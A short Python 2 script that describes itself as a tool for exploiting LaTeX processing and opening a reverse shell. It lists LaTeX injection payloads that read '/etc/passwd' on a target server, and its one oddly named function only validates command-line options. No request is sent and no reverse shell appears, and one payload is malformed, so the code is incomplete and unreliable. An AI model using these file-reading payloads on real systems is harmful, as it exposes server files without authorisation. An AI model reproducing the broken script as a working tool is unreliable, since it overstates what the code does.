#coding:utf-8

import sys
import urllib2
import socket
import options
import re

class IncorrectProgramException(Exception):
	def __init__(self, OutputCondition=None):
		self.OutputCondition = OutputCondition

# This tool allows to exploit Latex without any problem.
# You will also have the opportunity to do a reverse shell.

ServicesPollers = {
		"Reading-Files": {
			"\input{/etc/passwd}":					False,
			"\usepackage{verbatim}":				False,
			"\+verbatiminput{/etc/passwd}":	False
	}
}

def BertModel():
	"""

	This function will allow us to test conditions,
	and to make the attack.

	Parameters
	----
	None Parameters.

	Return
	----
	This function will
	return values.

	"""

	SettingsURL = options.URL
	SettingsDATA = options.DATA
	SettingsOSSH = options.OSSH

	if(SettingsURL == None):
		sys.exit("[!] Please put the URL with option '-u'.")
	if(SettingsDATA == None):
		sys.exit("[!] Please put the DATA with option '-d'.")
	if(SettingsOSSH == None):
		sys.exit("[!] Please put the DATA with option '-o'.")

	# So here we will test the variables and their values.
	# It is a subjective criterion.

	if(SettingsURL.startswith(("http://", "https://")) == False):
		raise IncorrectProgramException("[!] Incorrect URL.")
	if not(re.search('(\w+[=]+\w+[&]{0,})', SettingsDATA)):
		raise IncorrectProgramException("[!] Incorrect DATA.")

if __name__ == "__main__":
	BertModel()
